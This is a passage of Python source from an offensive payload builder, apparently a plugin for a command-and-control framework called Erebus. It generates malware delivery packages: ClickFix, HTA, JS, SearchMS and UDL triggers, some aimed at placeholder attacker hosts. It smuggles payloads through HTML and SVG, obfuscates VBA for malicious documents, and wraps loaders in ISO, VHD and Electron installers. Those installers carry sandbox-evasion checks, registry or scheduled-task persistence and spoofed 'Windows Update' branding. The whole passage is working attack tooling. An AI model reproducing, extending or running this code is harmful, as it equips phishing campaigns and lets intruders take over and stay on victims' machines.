    def generate_iocs_file(self, iocs_list: list, output_path: str) -> None:
        """Generate IOCs.txt file with all file hashes"""
        if not iocs_list:
            return

        try:
            with open(output_path, 'w') as f:
                f.write("=" * 80 + "\n")
                f.write("EREBUS WRAPPER - GENERATED INDICATORS OF COMPROMISE (IOCs)\n")
                f.write("=" * 80 + "\n\n")
                f.write(f"Generation Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}\n")
                f.write(f"Total Files: {len(iocs_list)}\n\n")
                f.write("-" * 80 + "\n")
                f.write(f"{'Timestamp':<20} {'Filename':<40} {'SHA256 Hash':<60}\n")
                f.write("-" * 80 + "\n\n")

                for ioc in iocs_list:
                    f.write(f"{ioc['timestamp']:<20} {ioc['filename']:<40} {ioc['sha256']:<60}\n")

                f.write("\n" + "-" * 80 + "\n")
                f.write("Detailed Information:\n")
                f.write("-" * 80 + "\n\n")

                for idx, ioc in enumerate(iocs_list, 1):
                    f.write(f"[{idx}] {ioc['filename']}\n")
                    f.write(f"    Timestamp: {ioc['timestamp']}\n")
                    f.write(f"    SHA256:    {ioc['sha256']}\n")
                    f.write(f"    Path:      {ioc['full_path']}\n\n")
        except Exception as e:
            print(f"[!] Failed to generate IOCs file: {str(e)}")

    def generate_attack_coverage(self, output_path: str) -> None:
        """Write ATT&CK technique coverage file based on current build parameters."""
        # Map: (param_name, value_or_True) → [(technique_id, technique_name)]
        _TECHNIQUE_MAP = [
            # Trigger / delivery
            ("2.0 Trigger Type", "HTML",       [("T1027.006", "HTML Smuggling")]),
            ("2.0 Trigger Type", "SVG",        [("T1027.006", "SVG Smuggling")]),
            ("2.0 Trigger Type", "BAT",        [("T1059.003", "Windows Command Shell")]),
            ("2.0 Trigger Type", "HTA",        [("T1218.005", "Mshta")]),
            ("2.0 Trigger Type", "ClickFix",   [("T1204.002", "User Execution: Malicious File")]),
            ("2.0 Trigger Type", "URL",        [("T1204.002", "User Execution: Malicious File")]),
            ("2.0 Trigger Type", "JS",         [("T1059.007", "JavaScript")]),
            ("2.0 Trigger Type", "CHM",        [("T1218.001", "Compiled HTML File")]),
            ("2.0 Trigger Type", "MSI",        [("T1218.007", "Msiexec")]),
            ("2.0 Trigger Type", "LNK",        [("T1204.002", "User Execution: Malicious File")]),
            ("2.0 Trigger Type", "MSC",        [("T1218.014", "MMC")]),
            ("2.0 Trigger Type", "VSCode",     [("T1204.002", "User Execution: Malicious File"),
                                                ("T1059.007", "JavaScript"),
                                                ("T1546",     "Event Triggered Execution")]),
            # Container
            ("3.0 Container Type", "ISO",      [("T1553.005", "Mark-of-the-Web Bypass")]),
            ("3.0 Container Type", "VHD",      [("T1553.005", "Mark-of-the-Web Bypass")]),
            ("3.0 Container Type", "Zip",      [("T1027",     "Obfuscated Files or Information")]),
            ("3.0 Container Type", "7z",       [("T1027",     "Obfuscated Files or Information")]),
            # Injection type
            ("0.4 Shellcode Loader - Injection Type", "1", [("T1055.003", "Process Injection: Thread Execution Hijacking")]),
            ("0.4 Shellcode Loader - Injection Type", "2", [("T1055",     "Process Injection")]),
            ("0.4 Shellcode Loader - Injection Type", "3", [("T1055.004", "Asynchronous Procedure Call")]),
            ("0.4 Shellcode Loader - Injection Type", "4", [("T1055.015", "ListPlanting / Thread Pool Injection")]),
            ("0.4 Shellcode Loader - Injection Type", "5", [("T1055.004", "Asynchronous Procedure Call")]),
            ("0.4 Shellcode Loader - Injection Type", "6", [("T1055.013", "Process Doppelgänging / Module Stomping")]),
            ("0.4 Shellcode Loader - Injection Type", "7", [("T1055",     "KernelCallbackTable Hijack")]),
            ("0.4 Shellcode Loader - Injection Type", "8", [("T1055.012", "Process Hollowing (TxF)")]),
            # Obfuscation
            ("0.0c Enable Donut", True,        [("T1027.009", "Embedded Payloads (Donut PE→shellcode)")]),
            # Evasion
            ("0.5a Enable Guardrails", True,   [("T1480.001", "Execution Guardrails: Environmental Keying")]),
            ("0.5n Callstack Spoofing", True,  [("T1036",     "Masquerading (Callstack Spoof)")]),
            ("6.0 Codesign Loader", True,      [("T1553.002", "Code Signing")]),
            # Infra
            ("7.0 Generate Redirector Configs", True, [("T1090.002", "External Proxy / Redirector")]),
            # Maldoc
            ("0.9 Create MalDoc", "Excel (XLSM)",  [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
            ("0.9 Create MalDoc", "VBA",            [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
            ("0.9 Create MalDoc", "Build Matrix",   [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
        ]

        lines = [
            "=" * 72,
            "EREBUS WRAPPER - ATT&CK TECHNIQUE COVERAGE",
            "=" * 72,
            f"Build time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "",
            f"{'Technique ID':<16} {'Technique Name':<42} {'Build Parameter'}",
            "-" * 72,
        ]

        seen: set = set()
        for param_name, match_val, techniques in _TECHNIQUE_MAP:
            try:
                actual = self.get_parameter(param_name)
            except Exception:
                continue
            if match_val is True:
                triggered = bool(actual)
            else:
                triggered = (str(actual) == str(match_val))
            if not triggered:
                continue
            for tid, tname in techniques:
                key = (tid, param_name)
                if key in seen:
                    continue
                seen.add(key)
                short_param = param_name.split(" ", 1)[-1] if " " in param_name else param_name
                lines.append(f"{tid:<16} {tname:<42} {short_param}")

        # Always-present techniques (any Erebus loader build)
        always = [
            ("T1027",     "Obfuscated Files or Information",   "Shellcode obfuscation pipeline"),
            ("T1620",     "Reflective Code Loading",           "In-memory loader execution"),
        ]
        for tid, tname, note in always:
            if tid not in {k for k, _ in seen}:
                lines.append(f"{tid:<16} {tname:<42} {note}")

        lines += [
            "",
            "-" * 72,
            f"Total techniques: {len(seen) + len(always)}",
            "Reference: https://attack.mitre.org",
        ]

        try:
            with open(output_path, "w", encoding="utf-8") as f:
                f.write("\n".join(lines) + "\n")
        except Exception as e:
            print(f"[!] Failed to write attack_coverage.txt: {e}")

    async def obfuscate_vba(self, vba_code):
        """Obfuscate VBA code locally or via plugin"""
        try:
            from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
            plugin = PayloadMalDocsPlugin()
            return plugin.obfuscate_vba(vba_code)
        except ImportError:
            # Fallback: simple obfuscation without plugin
            import re
            obfuscated = vba_code
            replacements = {
                'Shell': 'Sh' + chr(101) + 'll',
                'CreateObject': 'Cr' + chr(101) + 'ateObject',
                'WScript': 'WSc' + chr(114) + 'ipt',
            }
            for original, replacement in replacements.items():
                obfuscated = re.sub(rf'\b{original}\b', replacement, obfuscated, flags=re.IGNORECASE)
            return obfuscated


    def _bundle_helper_as_single_file(self, helper_src: Path, output_path: Path) -> None:
        """Merge all Erebus.Helper module sources into a single standalone Python script.

        The resulting file has no relative imports and can be run directly as
        ``python erebus_helper.py <command>`` on a Windows host, or compiled
        into a single exe via ``pyinstaller --onefile erebus_helper.py``.
        """
        module_order = ["compile_xll", "trigger_lnk", "container_msi"]
        # Relative-import lines produced by __init__.py – strip them from main.py
        strip_prefixes = ("from modules.", "from .compile_xll", "from .trigger_lnk", "from .container_msi")

        sections: list[str] = []

        # 1. One shared header with all stdlib imports so duplicates collapse naturally
        sections.append(
            "#!/usr/bin/env python3\n"
            "# erebus_helper.py – auto-generated single-file bundle\n"
            "# Run: python erebus_helper.py <command> [options]\n"
            "# Or compile: pyinstaller --onefile erebus_helper.py\n"
        )

        # 2. Emit each module body, stripping its module-level docstring marker and
        #    any intra-package imports so nothing references 'modules.*'
        for mod_name in module_order:
            mod_path = helper_src / "modules" / f"{mod_name}.py"
            if not mod_path.exists():
                continue
            src = mod_path.read_text(encoding="utf-8")
            # Drop lines that are relative imports (they'll be inlined here)
            filtered = "\n".join(
                line for line in src.splitlines()
                if not any(line.startswith(p) for p in strip_prefixes)
            )
            sections.append(f"\n# {'='*72}\n# Module: {mod_name}\n# {'='*72}\n")
            sections.append(filtered)

        # 2b. Inline vba_compiler so the ZIP fallback works on the operator host
        #     without requiring the full erebus_wrapper package.
        vba_compiler_src = helper_src.parent / "vba_compiler"
        vc_strip = ("from .compression import", "from .compiler import",
                    "from agent_code.vba_compiler", "from vba_compiler import")
        for vc_mod in ("compression", "compiler"):
            vc_path = vba_compiler_src / f"{vc_mod}.py"
            if not vc_path.exists():
                continue
            vc_src = vc_path.read_text(encoding="utf-8")
            vc_filtered = "\n".join(
                line for line in vc_src.splitlines()
                if not any(line.startswith(p) for p in vc_strip)
            )
            sections.append(f"\n# {'='*72}\n# vba_compiler: {vc_mod}\n# {'='*72}\n")
            sections.append(vc_filtered)

        # 3. Emit main.py, dropping only the 'from modules.*' import lines
        main_path = helper_src / "main.py"
        main_src = main_path.read_text(encoding="utf-8")
        filtered_main = "\n".join(
            line for line in main_src.splitlines()
            if not any(line.startswith(p) for p in strip_prefixes)
        )
        sections.append(f"\n# {'='*72}\n# main\n# {'='*72}\n")
        sections.append(filtered_main)

        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text("\n".join(sections), encoding="utf-8")

    async def _build_all_variants(self, agent_build_path: str) -> bytes:
        """Build one artifact per trigger type and per container type.

        Called when "0.0g Build All Configurations" is enabled. The compiled
        loader must already exist in agent_build_path/payload/ before this
        runs. Returns raw bytes of a master ZIP containing:
            triggers/<TYPE>/payload_<type>.zip  - trigger variant ZIPs
            containers/<TYPE>/payload.<ext>      - container variant files
            MANIFEST.txt                         - build summary
        """
        import io

        build_root = Path(agent_build_path)
        src_payload = build_root / "payload"
        decoy_dir   = build_root / "decoys"
        decoy_file  = decoy_dir / "decoy.pdf"

        # Snapshot compiled payload dir so each variant gets a clean copy.
        snap_root = Path(tempfile.mkdtemp(prefix="erebus_snap_"))
        snap_payload = snap_root / "payload"
        if src_payload.exists():
            shutil.copytree(str(src_payload), str(snap_payload))
        else:
            snap_payload.mkdir(parents=True)

        def _fresh_build(tag: str) -> Path:
            """Return a fresh agent_build_path clone for one variant."""
            work = Path(tempfile.mkdtemp(prefix=f"erebus_{tag}_"))
            shutil.copytree(str(snap_payload), str(work / "payload"))
            if decoy_dir.exists():
                shutil.copytree(str(decoy_dir), str(work / "decoys"))
            return work

        def _find_exe(work: Path) -> Path:
            for ext in ("exe", "dll", "xll"):
                p = work / "payload" / f"erebus.{ext}"
                if p.exists():
                    return p
            return work / "payload" / "erebus.exe"

        def _zip_dir(src_dir: Path) -> bytes:
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
                for f in sorted(src_dir.rglob("*")):
                    if f.is_file():
                        z.write(f, f.relative_to(src_dir))
            buf.seek(0)
            return buf.read()

        # Default command used across trigger variants (malleable, operator
        # can customize via normal parameters on subsequent targeted builds).
        _cmd_bin  = r"C:\Windows\System32\rundll32.exe"
        _cmd_args = "erebus.dll,EntryPoint"
        _cmd_full = f"{_cmd_bin} {_cmd_args}"

        # (tag, callable(work_root) → trigger_path_or_None)
        trigger_specs = [
            ("BAT", lambda w: create_bat_payload_trigger(
                target_bin=_cmd_bin, args=_cmd_args,
                payload_dir=w / "payload", decoy_file=decoy_file)),
            ("HTA", lambda w: create_hta_trigger(
                command=_cmd_full,
                output_filename="setup.hta",
                payload_dir=w / "payload",
                decoy_path=str(decoy_file) if decoy_file.exists() else "")),
            ("HTML", lambda w: create_html_smuggling_trigger(
                payload_path=str(_find_exe(w)),
                output_filename="document.html",
                download_name=_find_exe(w).name,
                payload_dir=w / "payload")),
            ("ClickFix", lambda w: create_clickfix_trigger(
                command=_cmd_full,
                output_filename="verify.html",
                payload_dir=w / "payload")),
            ("URL", lambda w: create_url_trigger(
                target_url=r"file://attacker/share/erebus.dll",
                output_filename="document.url",
                payload_dir=w / "payload")),
            ("JS", lambda w: create_jscript_trigger(
                command=_cmd_full,
                output_filename="update.js",
                payload_dir=w / "payload",
                obfuscate_command=True,
                decoy_path=str(decoy_file) if decoy_file.exists() else "")),
            ("CHM", lambda w: create_chm_project(
                executable=_cmd_bin,
                arguments=_cmd_args,
                output_dir=str(w / "payload" / "chm_project"),
                chm_name="document.chm",
                title="Help Documentation")),
            ("SVG", lambda w: create_svg_smuggling_trigger(
                payload_path=str(_find_exe(w)),
                output_filename="document.svg",
                payload_dir=w / "payload",
                download_name=_find_exe(w).name,
                obfuscate_b64=True)),
            ("MSI", lambda w: create_msi_payload_trigger(
                payload_exe="erebus.exe",
                payload_dir=w / "payload",
                decoy_file=decoy_file)),
            ("MSC", lambda w: create_msc_explorer_trigger(
                payload_exe="erebus.exe",
                payload_dir=w / "payload",
                decoy_file=decoy_file)),
            ("HTML-Encrypted", lambda w: create_encrypted_html_smuggling_trigger(
                payload_path=str(_find_exe(w)),
                password="Passw0rd!",
                output_filename="document.html",
                download_name=_find_exe(w).name,
                payload_dir=w / "payload")),
            ("HTML-Geofenced", lambda w: create_geofenced_html_smuggling_trigger(
                payload_path=str(_find_exe(w)),
                allowed_countries=["US", "GB", "CA"],
                fallback_redirect="https://www.microsoft.com",
                output_filename="document.html",
                download_name=_find_exe(w).name,
                payload_dir=w / "payload")),
            ("SearchMS", lambda w: create_searchms_trigger(
                webdav_host="dav.attacker.com",
                webdav_share="share",
                webdav_ssl=True,
                display_name="System Update",
                output_filename="document.html",
                payload_dir=w / "payload")),
            ("UDL", lambda w: create_udl_trigger(
                attacker_host="attacker.com",
                share_name="share",
                output_filename="database.udl",
                payload_dir=w / "payload")),
            ("QR", lambda w: create_qr_html_trigger(
                url="https://login.microsoftonline.com/",
                output_filename="verify.html",
                payload_dir=w / "payload")),
            ("VSCode", lambda w: create_vscode_ext_trigger(
                shellcode_path=pathlib.Path(mythic_shellcode_path),
                payload_dir=w / "payload",
                decoy_file=decoy_file)),
            ("AppDomain", lambda w: create_appdomain_config(
                target_exe="AddInProcess.exe",
                output_dir=w / "payload")),
        ]

        # (tag, callable(work_root) → output_path_or_None)
        container_specs = [
            ("Zip", lambda w: build_zip(
                compression=9, password=None,
                build_path=w, visible_extension=".bat")),
            ("7z",  lambda w: build_7z(
                compression="9", password=None,
                build_path=w, visible_extension=".bat")),
            ("ISO", lambda w: build_iso(
                volume_id="EREBUS", enable_autorun=False,
                source_iso=None, build_path=w, visible_extension=".bat")),
            ("VHD", lambda w: build_vhd(
                build_path=w, visible_extension=".bat",
                volume_label="EREBUS", output_filename="payload.vhd")),
        ]

        manifest_lines = [
            "Erebus - Build All Configurations",
            f"Generated : {datetime.now().isoformat()}",
            "",
            "TRIGGERS (one ZIP per type; contains loader + trigger script):",
        ]

        master_buf = io.BytesIO()
        with zipfile.ZipFile(master_buf, "w", zipfile.ZIP_DEFLATED) as mz:

            # ── Trigger variants ──────────────────────────────────────────────
            _loop = asyncio.get_running_loop()
            for tag, tfn in trigger_specs:
                work = _fresh_build(tag)
                try:
                    await _loop.run_in_executor(None, tfn, work)
                    data = _zip_dir(work / "payload")
                    mz.writestr(f"triggers/{tag}/payload_{tag.lower()}.zip", data)
                    manifest_lines.append(f"  triggers/{tag}/payload_{tag.lower()}.zip  - OK")
                except Exception as exc:
                    mz.writestr(f"triggers/{tag}/ERROR.txt", f"{tag} failed: {exc}")
                    manifest_lines.append(f"  triggers/{tag}/ERROR.txt           - FAILED: {exc}")
                finally:
                    shutil.rmtree(str(work), ignore_errors=True)

            manifest_lines.append("")
            manifest_lines.append("CONTAINERS (loader + BAT trigger wrapped in each container format):")

            # ── Container variants ────────────────────────────────────────────
            for tag, cfn in container_specs:
                work = _fresh_build(f"container_{tag}")
                try:
                    # Add a BAT trigger as the baseline execution mechanism
                    create_bat_payload_trigger(
                        target_bin=_cmd_bin, args=_cmd_args,
                        payload_dir=work / "payload", decoy_file=decoy_file)
                    out_path = await _loop.run_in_executor(None, cfn, work)
                    if out_path and Path(out_path).exists():
                        suffix = Path(out_path).suffix
                        arc_name = f"containers/{tag}/payload_{tag.lower()}{suffix}"
                        mz.write(str(out_path), arc_name)
                        manifest_lines.append(f"  {arc_name}  - OK")
                    else:
                        mz.writestr(f"containers/{tag}/ERROR.txt", f"{tag}: no output file produced")
                        manifest_lines.append(f"  containers/{tag}/ERROR.txt  - FAILED: no output")
                except Exception as exc:
                    mz.writestr(f"containers/{tag}/ERROR.txt", f"{tag} failed: {exc}")
                    manifest_lines.append(f"  containers/{tag}/ERROR.txt  - FAILED: {exc}")
                finally:
                    shutil.rmtree(str(work), ignore_errors=True)

            mz.writestr("MANIFEST.txt", "\n".join(manifest_lines))

        shutil.rmtree(str(snap_root), ignore_errors=True)
        master_buf.seek(0)
        return master_buf.read()

    def _wrap_in_outer_transport(
        self,
        inner_path: "Path",
        outer_type: str,
    ) -> "Path":
        """
        Wrap *inner_path* inside an outer ISO / VHD / ZIP / 7z transport layer.

        Creates a temp staging directory, copies *inner_path* into its
        ``payload/`` sub-directory, then calls the appropriate container
        builder.  The file's original extension is preserved so the victim
        sees the correct icon when browsing the mounted / extracted transport.

        Returns the path to the outer container file.
        """
        import tempfile as _tempfile
        import shutil as _shutil

        staging   = Path(_tempfile.mkdtemp(prefix="erebus_outer_"))
        pay_stage = staging / "payload"
        pay_stage.mkdir()
        _shutil.copy2(str(inner_path), str(pay_stage / inner_path.name))

        inner_ext = inner_path.suffix   # e.g. ".exe", ".msi", ".iso", ".vhd"

        if outer_type == "ZIP":
            return build_zip(
                compression=self.get_parameter("3.1 Compression Level"),
                password=self.get_parameter("3.2 Archive Password"),
                build_path=staging,
                visible_extension=inner_ext,
            )
        if outer_type == "7z":
            return build_7z(
                compression=self.get_parameter("3.1 Compression Level"),
                password=self.get_parameter("3.2 Archive Password"),
                build_path=staging,
                visible_extension=inner_ext,
            )
        if outer_type == "ISO":
            return build_iso(
                volume_id=self.get_parameter("4.0 ISO Volume ID") or "SETUP",
                enable_autorun=False,          # outer ISO is a transport; no autorun
                source_iso=None,
                build_path=staging,
                visible_extension=inner_ext,
            )
        if outer_type == "VHD":
            return build_vhd(
                build_path=staging,
                visible_extension=inner_ext,
                volume_label=(self.get_parameter("4.0 ISO Volume ID") or "SETUP")[:11].upper(),
                output_filename="payload.vhd",
            )

        return inner_path   # outer_type == "None" or unknown

    async def containerise_payload(self, agent_build_path):
        """
        Build the inner container then optionally wrap it in an outer transport.

        Inner container  = "3.0 Container Type"  (Electron, MSI, ISO, VHD, ZIP, 7z, AppInstaller)
        Outer transport  = "3.0T Outer Transport" (None, ISO, VHD, ZIP, 7z)

        Electron and MSI are self-extracting / self-executing containers: the NSIS
        installer (Electron) copies the payload to %TEMP% and spawns it; the MSI
        CustomAction launches it after InstallFinalize.  When an outer transport is
        selected those self-extracting executables are simply wrapped inside the
        chosen archive or disk image so the victim double-clicks the transport,
        extracts or mounts it, and then runs the inner EXE/MSI.
        """
        inner_path = await self._build_inner_container(agent_build_path)
        outer = (self.get_parameter("3.0T Outer Transport") or "None").strip()
        if inner_path and outer != "None":
            inner_path = await asyncio.get_running_loop().run_in_executor(
                None, self._wrap_in_outer_transport, inner_path, outer
            )
        return inner_path

    async def _build_inner_container(self, agent_build_path):
        """Build and return the primary (inner) container file path."""

        ext_source = self.get_parameter("0.8 Output Extension Source")
        if ext_source == "MalDoc":
            maldoc_mode = self.get_parameter("0.9 Create MalDoc")
            if maldoc_mode == "VBA Module Only":
                target_ext = ".bas"
            else:
                _fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()
                _ext_map = {
                    "xlsm": ".xlsm", "xlsx": ".xlsx", "xlam": ".xlam",
                    "docm": ".docm", "doc": ".doc",
                    "pptm": ".pptm", "ppam": ".ppam",
                    "docx-remote-template": ".docx",
                }
                target_ext = _ext_map.get(_fmt, ".xlsm")
        else:
            _raw_trigger_ext = self.get_parameter('0.9 Trigger Type').lower()
            target_ext = ".vsix" if _raw_trigger_ext == "vscode" else f".{_raw_trigger_ext}"


        match(self.get_parameter("3.0 Container Type")):
            case "7z":
                return build_7z(
                    compression=self.get_parameter("3.1 Compression Level"),
                    password=self.get_parameter("3.2 Archive Password"),
                    build_path=Path(agent_build_path),
                    visible_extension=target_ext
                )

            case "Zip":
                return build_zip(
                    compression=self.get_parameter("3.1 Compression Level"),
                    password=self.get_parameter("3.2 Archive Password"),
                    build_path=Path(agent_build_path),
                    visible_extension=target_ext
                )

            case "ISO":
                source_iso_path = None
                iso_uuid = self.get_parameter("4.2 ISO Backdoor File")
                if iso_uuid:
                    file_resp = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=iso_uuid)
                    )
                    if file_resp.Success:
                        filename = f"template_{iso_uuid}.iso"
                        temp_dir = Path(tempfile.gettempdir())
                        source_iso_path = temp_dir / filename
                        source_iso_path.write_bytes(file_resp.Content)
                return build_iso(
                                    volume_id=self.get_parameter("4.0 ISO Volume ID"),
                                    enable_autorun = self.get_parameter("4.1 ISO enable Autorun"),
                                    source_iso=source_iso_path,
                                    build_path=Path(agent_build_path),
                                    visible_extension=target_ext
                                )

            case "MSI":
                return build_msi(
                    build_path=Path(agent_build_path),
                    app_name=self.get_parameter("5.0 MSI Product Name"),
                    manufacturer=self.get_parameter("5.1 MSI Manufacturer"),
                    install_scope=self.get_parameter("5.2 MSI Install Scope")
                )

            case "Electron":
                # Optional pre-built payload zip: extract erebus.{exe,dll,xll}
                # into payload/ before containerisation, replacing compiled output.
                payload_zip_uuid = self.get_parameter("3.E6b Electron Payload Zip")
                if payload_zip_uuid:
                    zip_resp = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=payload_zip_uuid)
                    )
                    if not zip_resp.Success or not zip_resp.Content:
                        raise RuntimeError("Failed to retrieve 3.E6b Electron Payload Zip from Mythic.")
                    _payload_dir = Path(agent_build_path) / "payload"
                    _payload_dir.mkdir(parents=True, exist_ok=True)
                    allowed = {"erebus.exe", "erebus.dll", "erebus.xll"}
                    with zipfile.ZipFile(io.BytesIO(zip_resp.Content)) as zf:
                        extracted = []
                        for member in zf.namelist():
                            basename = Path(member).name
                            if basename in allowed:
                                (_payload_dir / basename).write_bytes(zf.read(member))
                                extracted.append(basename)
                    if not extracted:
                        raise RuntimeError(
                            "3.E6b Electron Payload Zip contained no erebus.{exe,dll,xll}."
                        )

                # Optional operator-supplied icon (PNG). Fetched from Mythic
                # by file UUID when set; falls back to the vendored Erebus.png.
                custom_icon_bytes = None
                electron_icon_uuid = self.get_parameter("3.E6a Electron Custom Icon")
                if electron_icon_uuid:
                    icon_resp = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=electron_icon_uuid)
                    )
                    if icon_resp.Success:
                        custom_icon_bytes = icon_resp.Content

                def _int_or(name, default=0):
                    raw = self.get_parameter(name)
                    try:
                        return int(raw) if raw not in (None, "") else default
                    except (TypeError, ValueError):
                        return default

                guardrails_cfg = {
                    "enabled": bool(self.get_parameter("3.E9 Enable Electron Guardrails")),
                    "dwellMs": _int_or("3.E9a Dwell Time (ms)", 2500),
                    "requireMouseMovement": bool(self.get_parameter("3.E9b Require Mouse Movement")),
                    "checkDebugger": bool(self.get_parameter("3.E9c Check Debugger")),
                    "checkSandboxEnv": bool(self.get_parameter("3.E9d Check Sandbox Env Vars")),
                    "checkDefaultBadUsernames": bool(self.get_parameter("3.E9e Check Default Bad Usernames")),
                    "checkDefaultBadHostnames": bool(self.get_parameter("3.E9f Check Default Bad Hostnames")),
                    "hostnameWhitelist": self.get_parameter("3.E9g Hostname Whitelist") or "",
                    "hostnameBlocklist": self.get_parameter("3.E9h Hostname Blocklist") or "",
                    "usernameWhitelist": self.get_parameter("3.E9i Username Whitelist") or "",
                    "usernameBlocklist": self.get_parameter("3.E9j Username Blocklist") or "",
                    "minScreenWidth": _int_or("3.E9k Min Screen Width", 0),
                    "minScreenHeight": _int_or("3.E9l Min Screen Height", 0),
                    "minCpuCount": _int_or("3.E9m Min CPU Count", 0),
                    "minMemoryMb": _int_or("3.E9n Min Memory (MB)", 0),
                    "maxIdleSeconds": _int_or("3.E9o Max Idle Seconds", 0),
                    "preSpawnDelayMs": _int_or("3.E9p Pre-Spawn Delay (ms)", 0),
                    "debugMode": bool(self.get_parameter("3.E9q Guardrail Debug Mode")),
                }

                _persist_method_map = {
                    "Registry Run Key":  "registry_run",
                    "Registry RunOnce":  "registry_run_once",
                    "Startup Folder":    "startup_folder",
                    "Scheduled Task":    "scheduled_task",
                }
                _persist_install_dir_raw = self.get_parameter("3.P3 Persistence Install Dir") or "%APPDATA%"
                persistence_cfg = {
                    "enabled":    bool(self.get_parameter("3.P0 Enable Persistence")),
                    "method":     _persist_method_map.get(self.get_parameter("3.P1 Persistence Method") or "", "registry_run"),
                    "name":       self.get_parameter("3.P2 Persistence Name") or "",
                    "installDir": "localappdata" if "LOCAL" in _persist_install_dir_raw.upper() else "appdata",
                }

                return build_electron_installer(
                    build_path=Path(agent_build_path),
                    product=self.get_parameter("3.E0 Electron Product Name"),
                    publisher=self.get_parameter("3.E1 Electron Publisher"),
                    version=self.get_parameter("3.E2 Electron Version"),
                    arch=self.get_parameter("3.E3 Electron Architecture"),
                    entry_format=self.get_parameter("3.E4 Electron Entry Format"),
                    entry_name=f"erebus.{self.get_parameter('3.E4 Electron Entry Format')}",
                    dll_entry=self.get_parameter("3.E5 Electron DLL Entry Point") or "DllMain",
                    file_description=self.get_parameter("3.E7 Electron File Description") or "Setup",
                    copyright_str=self.get_parameter("3.E8 Electron Copyright") or "",
                    custom_icon_bytes=custom_icon_bytes,
                    guardrails=guardrails_cfg,
                    persistence=persistence_cfg,
                )

            case "VHD":
                # Fixed VHD: FAT16 disk image + 512-byte VHD footer.
                # Files inside a mounted VHD do NOT inherit MOTW from the download.
                # Bypasses ISO-blocking policies; mounts on double-click in Explorer.
                return build_vhd(
                    build_path=Path(agent_build_path),
                    visible_extension=target_ext,
                    volume_label=(self.get_parameter("4.0 ISO Volume ID") or "EREBUS")[:11].upper(),
                    output_filename="payload.vhd",
                )

            case "AppInstaller":
                # Generate .appinstaller manifest + MSIX package structure.
                # Operator must: run build_msix.bat on Windows, upload MSIX to
                # the hosting URL, then deliver setup.appinstaller to victim.
                ai_path = build_appinstaller(
                    build_path=Path(agent_build_path),
                    msix_uri=str(self.get_parameter("3.AI0 MSIX Hosting URL")),
                    package_name=str(self.get_parameter("3.AI1 MSIX Package Name") or "Microsoft.WindowsUpdate"),
                    display_name=str(self.get_parameter("3.AI2 MSIX Display Name") or "Windows Update Assistant"),
                )
                # Also produce the MSIX package structure for operator to sign & host
                payload_dir = Path(agent_build_path) / "payload"
                build_msix_structure(
                    build_path=Path(agent_build_path),
                    payload_files=list(payload_dir.iterdir()) if payload_dir.exists() else [],
                    package_name=str(self.get_parameter("3.AI1 MSIX Package Name") or "Microsoft.WindowsUpdate"),
                    display_name=str(self.get_parameter("3.AI2 MSIX Display Name") or "Windows Update Assistant"),
                )
                return ai_path

        return None

    async def build(self) -> BuildResponse:
        response = BuildResponse(status = BuildStatus.Error)
        output = ""

        try:
            if not ErebusWrapper._validation_run:
                ErebusWrapper._validation_run = True
                run_plugin_validation()
                try:
                    await report_validation_results(operation_id=getattr(self, "operation_id", None))
                except Exception as e:
                    print(f"[!] Could not report plugin status: {e}")

            # Pre-flight: verify critical build tools are available
            preflight_errors = []
            for tool in ["x86_64-w64-mingw32-g++", "python3"]:
                if not shutil.which(tool):
                    preflight_errors.append(tool)
            if preflight_errors:
                response.build_stderr = f"Missing build tools: {', '.join(preflight_errors)}. Check Dockerfile."
                return response

            # Initialize IOCs tracking list
            iocs_list = []
            generation_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            agent_build_path = tempfile.TemporaryDirectory(suffix = self.uuid).name
            agent_code_path = Path(__file__).resolve().parent.parent / "agent_code"
            shutil.copytree(
                str(agent_code_path),
                agent_build_path,
                dirs_exist_ok=True,
                ignore=shutil.ignore_patterns(
                    "*.o", "*.obj",
                    "erebus.exe", "erebus.dll", "erebus.xll",
                    "erebus_test*", "erebus_guardrails_test*", "erebus_injection_test*",
                    "__pycache__",
                ),
            )

            mythic_shellcode_path = PurePath(agent_build_path) / "shellcode" / "payload.bin"
            mythic_shellcode_path = str(mythic_shellcode_path)

            obfuscated_shellcode_path = PurePath(agent_build_path) / "shellcode" / "obfuscated.bin"
            obfuscated_shellcode_path = str(obfuscated_shellcode_path)

            shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
            clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
            vmloader_path         = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.VMLoader"
            encrypted_shellcode_path_sc = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "shellcode.hpp"
            shellcode_loader_path = str(shellcode_loader_path)
            clickonce_loader_path = str(clickonce_loader_path)
            vmloader_path         = str(vmloader_path)
            encrypted_shellcode_path_sc = str(encrypted_shellcode_path_sc)

            nix_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.NixLoader"
            mac_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.MacLoader"
            nix_shellcode_h = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.NixLoader" / "include" / "shellcode.h"
            mac_shellcode_h = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.MacLoader" / "include" / "shellcode.h"
            nix_loader_path = str(nix_loader_path)
            mac_loader_path = str(mac_loader_path)
            nix_shellcode_h = str(nix_shellcode_h)
            mac_shellcode_h = str(mac_shellcode_h)

            shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
            shellcrypt_path = str(shellcrypt_path)

            templates_path = PurePath(agent_build_path) / "templates"
            dll_exports_path = templates_path / "proxy.def"
